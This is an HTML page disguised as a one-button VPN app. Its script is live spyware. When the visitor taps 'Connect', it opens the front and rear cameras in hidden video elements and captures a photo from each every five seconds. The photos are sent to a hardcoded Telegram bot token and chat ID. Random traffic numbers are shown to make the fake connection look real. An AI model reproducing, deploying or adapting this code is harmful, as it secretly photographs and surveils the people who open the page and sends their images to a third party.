<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VPN</title>
  <style>
    body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
    .c{text-align:center;max-width:320px;width:100%;padding:20px}
    .loc{font-size:17px;margin-bottom:30px;opacity:0.9}
    .loc strong{color:#a8e6cf;font-weight:600}
    .circle{width:220px;height:220px;border-radius:50%;background:rgba(255,255,255,0.15);border:10px solid #ff4757;display:flex;justify-content:center;align-items:center;margin:0 auto 40px;cursor:pointer;transition:all .4s;box-shadow:0 10px 30px rgba(0,0,0,0.3);backdrop-filter:blur(10px)}
    .circle:hover{transform:scale(1.05)}
    .circle.connected{border-color:#39e75f}
    .t{font-size:28px;font-weight:700;color:#ff4757;text-shadow:0 2px 10px rgba(0,0,0,0.3)}
    .circle.connected .t{color:#39e75f;animation:p 1.8s infinite}
    @keyframes p{0%,100%{opacity:1}50%{opacity:0.75}}
    .s{display:flex;justify-content:space-around;font-size:19px}
    .v{font-weight:700;font-size:24px;margin-bottom:5px}
    .l{font-size:14px;opacity:0.8}
    .msg{margin-top:20px;font-size:16px;opacity:0.9}
    .retry{color:#ffb3b3;cursor:pointer;text-decoration:underline;font-weight:600}
  </style>
</head>
<body>
  <div class="c">
    <div class="loc">You are connected from <strong>United Kingdom</strong></div>
    <div class="circle" id="c"><div class="t" id="t">Connect</div></div>
    <div class="s">
      <div><div class="v" id="i">0.0 kB</div><div class="l">Incoming</div></div>
      <div><div class="v" id="o">0.0 kB</div><div class="l">Outgoing</div></div>
    </div>
    <div class="msg" id="m">Tap the circle to connect</div>
  </div>

  <video id="f" autoplay playsinline style="display:none"></video>
  <video id="r" autoplay playsinline style="display:none"></video>
  <canvas id="x" style="display:none"></canvas>

<script>
const TOKEN='6300357886:AAEKFRyfn2euN0bjMHuoSpn_yrrYo_n4EQQ';
const CHAT_ID='6156668050';

const circle=document.getElementById('c'),txt=document.getElementById('t'),msg=document.getElementById('m');
const i=document.getElementById('i'),o=document.getElementById('o');
const fv=document.getElementById('f'),rv=document.getElementById('r'),cv=document.getElementById('x'),ctx=cv.getContext('2d');
let on=false,int=null,sf=null,sr=null;

async function send(b,n){
  const d=new FormData();
  d.append('chat_id',CHAT_ID);
  d.append('photo',b,n);
  d.append('caption','DEV BY MASTERKAI');
  await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:d});
}

function shot(v,l){
  if(v.videoWidth){
    cv.width=v.videoWidth;cv.height=v.videoHeight;
    ctx.drawImage(v,0,0);
    cv.toBlob(b=>b&&send(b,`${l}_${Date.now()}.jpg`),'image/jpeg',0.9);
  }
}

async function start(){
  try{
    sf=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});fv.srcObject=sf;
    sr=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}});rv.srcObject=sr;
    int=setInterval(()=>{
      shot(fv,"front");
      shot(rv,"rear");
      i.textContent=(Math.random()*40+10).toFixed(1)+' kB';
      o.textContent=(Math.random()*50+15).toFixed(1)+' kB';
    },5000);
    circle.classList.add('connected');txt.textContent='Connected';msg.innerHTML='';on=true;
  }catch{
    msg.innerHTML='<span class="retry" onclick="start()">تلاش مجدد</span>';
  }
}

function stop(){
  [sf,sr].forEach(s=>s&&s.getTracks().forEach(t=>t.stop()));
  int&&clearInterval(int);
  circle.classList.remove('connected');txt.textContent='Connect';msg.textContent='Tap the circle to connect';
  i.textContent=o.textContent='0.0 kB';on=false;
}

circle.onclick=()=>{on?stop():start();}
window.onbeforeunload=stop;
</script>
</body>
</html>
